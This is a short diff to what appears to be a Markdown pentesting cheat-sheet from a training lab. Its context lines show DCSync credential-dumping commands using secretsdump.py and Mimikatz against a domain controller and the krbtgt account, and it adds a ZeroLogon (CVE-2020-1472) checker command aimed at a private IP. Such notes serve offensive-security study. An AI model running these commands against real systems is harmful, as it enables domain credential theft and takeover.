@@ -81,3 +81,10 @@ secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.
 # Performing DCSync with Mimikatz
 mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
 ```
+
+# ZeroLogon ( CVE-2020-1472 )
+```
+python3 zero_logon_checker.py WIN-WARZONE 192.168.0.239
+```
+
+
